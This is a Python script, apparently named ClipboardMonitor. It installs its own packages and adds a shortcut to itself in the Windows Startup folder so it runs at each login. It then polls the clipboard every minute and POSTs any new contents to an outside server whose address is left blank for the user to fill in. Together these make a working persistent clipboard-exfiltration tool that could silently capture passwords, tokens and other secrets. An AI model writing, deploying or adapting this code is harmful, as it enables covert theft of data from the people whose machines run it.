import subprocess
import sys
import pyperclip
import requests
import time
import os

REQUIRED_PACKAGES = ['pyperclip', 'requests', 'pywin32']

def install_dependencies():
    for package in REQUIRED_PACKAGES:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def main():
    try:
        import pyperclip
        import requests
        if sys.platform == 'win32':
            import win32com.client
    except ImportError:
        install_dependencies()
        sys.exit(0)

    import pyperclip
    import requests
    import time
    import os

    last_data = ""

    def send_data():
        nonlocal last_data
        while True:
            data = pyperclip.paste()
            if data and data != last_data:
                response = requests.post('', data=data) #put your ntfy server in the parentheses
                if response.status_code == 200:
                    last_data = data
            time.sleep(60)  # Change sleep duration to 60 seconds

    def create_startup_shortcut():
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shortcut_path = os.path.join(startup_folder, 'ClipboardMonitor.lnk')
        python_exe = sys.executable
        script_path = os.path.abspath(__file__)

        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = python_exe
        shortcut.Arguments = '"' + script_path + '"'
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.save()

    if sys.platform == 'win32':
        import win32com.client
        create_startup_shortcut()
    send_data()

if __name__ == "__main__":
    main()
